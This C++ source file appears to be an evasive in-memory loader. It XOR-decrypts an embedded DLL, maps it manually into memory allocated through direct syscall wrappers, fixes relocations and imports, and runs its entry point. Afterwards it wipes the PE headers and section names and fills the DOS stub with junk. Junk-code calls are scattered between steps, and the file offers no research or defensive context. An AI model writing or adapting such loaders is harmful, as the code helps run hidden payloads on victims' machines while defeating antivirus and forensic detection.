#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <string>
#include <cstring>
#include <syscalls.h>
#include <SyscallWrappers.h>
#include "encrypted-dll-with-warning.h"
#include "GarbageGenerator.h"

bool WipePEHeadersAndMetadata(LPVOID imageBase) {
	if (!imageBase) return false;
	
	auto dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
	
	auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)imageBase + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;

	SIZE_T headerSize = ntHeaders->OptionalHeader.SizeOfHeaders;
	DWORD oldProtect = 0;

	if (ProtectMemorySyscall(imageBase, headerSize, PAGE_READWRITE, &oldProtect)) {
		SecureZeroMemory(imageBase, headerSize);
		ProtectMemorySyscall(imageBase, headerSize, oldProtect, &oldProtect);
	}
	else {
		return false;
	}

	auto section = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
		if (ProtectMemorySyscall(section, sizeof(IMAGE_SECTION_HEADER), PAGE_READWRITE, &oldProtect)) {
			SecureZeroMemory(section->Name, IMAGE_SIZEOF_SHORT_NAME);
			ProtectMemorySyscall(section, sizeof(IMAGE_SECTION_HEADER), oldProtect, &oldProtect);
		}
		++section;
	}

	LPVOID dosStub = (LPBYTE)imageBase + sizeof(IMAGE_DOS_HEADER);
	ProtectMemorySyscall(dosStub, 0x40, PAGE_READWRITE, &oldProtect);
	JunkFill(dosStub, 0x40);
	ProtectMemorySyscall(dosStub, 0x40, oldProtect, &oldProtect);

	return true;
}

void XORDecrypt(BYTE* data, SIZE_T size, BYTE key) {
	for (SIZE_T i = 0; i < size; ++i) {
		data[i] ^= key;
	}
}

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main()
{
	InjectGarbage();

	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encrypted_dll_bin_len);
	if (!dllBytes) {
		return -1;
	}
	memcpy(dllBytes, encrypted_dll_bin, encrypted_dll_bin_len);

	XORDecrypt((BYTE*)dllBytes, encrypted_dll_bin_len, 0x0f);

	DWORD dllSize = encrypted_dll_bin_len;

	auto dosHeader = (PIMAGE_DOS_HEADER)dllBytes;
	auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)dllBytes + dosHeader->e_lfanew);
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

	LPVOID imageBase = AllocateMemorySyscall(imageSize);
	if (!imageBase) {
		imageBase = AllocateMemorySyscall(imageSize);
		if (!imageBase) {
			HeapFree(GetProcessHeap(), 0, dllBytes);
			return -1;
		}
	}

	InjectGarbage();

	uintptr_t delta = (uintptr_t)imageBase - ntHeaders->OptionalHeader.ImageBase;

	std::memcpy(imageBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	auto section = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
		LPVOID dest = (LPBYTE)imageBase + section->VirtualAddress;
		LPVOID src = (LPBYTE)dllBytes + section->PointerToRawData;
		std::memcpy(dest, src, section->SizeOfRawData);
		++section;
	}

	auto relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (relocDir.Size > 0) {
		uintptr_t relocAddr = (uintptr_t)imageBase + relocDir.VirtualAddress;
		uint32_t processed = 0;

		while (processed < relocDir.Size) {
			auto block = (PBASE_RELOCATION_BLOCK)(relocAddr + processed);
			processed += sizeof(BASE_RELOCATION_BLOCK);

			uint32_t entryCount = (block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			auto entries = (PBASE_RELOCATION_ENTRY)(relocAddr + processed);

			for (uint32_t i = 0; i < entryCount; ++i) {
				processed += sizeof(BASE_RELOCATION_ENTRY);
				if (entries[i].Type == 0) continue;

				uintptr_t patchAddr = (uintptr_t)imageBase + block->PageAddress + entries[i].Offset;
				uintptr_t* patchLocation = (uintptr_t*)patchAddr;
				*patchLocation += delta;
			}
		}
	}

	InjectGarbage();

	auto importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importDir.Size > 0) {
		auto importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((uintptr_t)imageBase + importDir.VirtualAddress);

		while (importDesc->Name) {
			LPCSTR libName = (LPCSTR)((uintptr_t)imageBase + importDesc->Name);
			HMODULE lib = LoadLibraryA(libName);
			if (!lib) {
				FreeMemorySyscall(imageBase);
				HeapFree(GetProcessHeap(), 0, dllBytes);
				return -1;
			}

			PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((uintptr_t)imageBase + importDesc->FirstThunk);
			PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((uintptr_t)imageBase + importDesc->OriginalFirstThunk);

			while (origThunk->u1.AddressOfData) {
				if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
					thunk->u1.Function = (uintptr_t)GetProcAddress(lib, MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk->u1.Ordinal)));
				}
				else {
					auto import = (PIMAGE_IMPORT_BY_NAME)((uintptr_t)imageBase + origThunk->u1.AddressOfData);
					thunk->u1.Function = (uintptr_t)GetProcAddress(lib, import->Name);
				}
				++thunk;
				++origThunk;
			}
			++importDesc;
		}
	}

	InjectGarbage();

	auto entryPoint = (DLLEntry)((uintptr_t)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	if (!entryPoint((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, nullptr)) {
		FreeMemorySyscall(imageBase);
		HeapFree(GetProcessHeap(), 0, dllBytes);
		return -1;
	}

	WipePEHeadersAndMetadata(imageBase);

	HeapFree(GetProcessHeap(), 0, dllBytes);
	return 0;
}